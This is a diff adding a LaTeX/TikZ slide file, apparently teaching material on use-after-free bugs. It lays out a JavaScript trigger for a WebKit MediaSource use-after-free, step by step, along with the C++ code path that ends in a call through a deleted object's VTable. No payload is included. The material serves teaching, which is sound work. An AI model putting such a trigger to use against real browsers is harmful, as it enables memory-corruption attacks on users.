@@ -1,0 +1,69 @@
+\documentclass[tikz]{standalone}
+\input{common/tikzBase}
+\usetikzlibrary{fit,matrix,calc}
+\newsavebox{\uafTriggerCodeA}
+\newsavebox{\uafTriggerCodeB}
+\begin{document}
+\begin{lrbox}{\uafTriggerCodeA}
+\lstset{
+    language=JavaScript,
+    style=smaller,
+    moredelim={**[is][\btHL<2>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3-4>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4>]{~4~}{~end~}},
+}
+\begin{lstlisting}
+// in HTML near this JavaScript:
+// <video id="vid"> (video player element)
+function source_opened() {
+  buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
+  ~2~vid.parentNode.removeChild(vid);~end~
+  gc(); // force garbage collector to run now
+  // garbage collector frees unreachable objects
+  // (would be run automatically, eventually, too)
+  // buffer now internally refers to delete'd player object
+  ~3~buffer.timestampOffset = 42;~end~
+}
+ms = new WebKitMediaSource();
+ms.addEventListener('webkitsourceopen', source_opened);
+vid.src = window.URL.createObjectURL(ms);
+\end{lstlisting}
+\end{lrbox}
+\begin{lrbox}{\uafTriggerCodeB}
+\lstset{
+    language=C++,
+    style=smaller,
+    moredelim={**[is][\btHL<2>]{~2~}{~end~}},
+    moredelim={**[is][\btHL<3-4>]{~3~}{~end~}},
+    moredelim={**[is][\btHL<4>]{~4~}{~end~}},
+    moredelim={**[is][\btHL<5>]{~5~}{~end~}},
+}
+\begin{lstlisting}
+// implements JavaScript buffer.timestampOffset = 42
+void SourceBuffer::setTimestampOffset(...) {
+     if (m_source->setTimestampOffset(...))
+        ...
+}
+bool MediaSource::setTimestampOffset(...) {
+    // m_player was deleted when video player element deleted
+    // but this call does *not* use a VTable
+    if (!~4~m_player~end~->sourceSetTimestampOffset(id, offset)) 
+        ...
+}
+bool MediaPlayer::sourceSetTimestampOffset(...) {
+    // m_private deleted when MediaPlayer deleted
+    // this *is* a VTable-based call
+    return ~5~m_private~end~->sourceSetTimestampOffset(id, offset);
+}
+\end{lstlisting}
+\end{lrbox}
+
+\setSlide{1}
+\input{uaf/texfig/UAFTriggering.inner.tex}
+\setSlide{2}
+\input{uaf/texfig/UAFTriggering.inner.tex}
+\setSlide{3}
+\input{uaf/texfig/UAFTriggering.inner.tex}
+\setSlide{4}
+\input{uaf/texfig/UAFTriggering.inner.tex}
+\end{document}
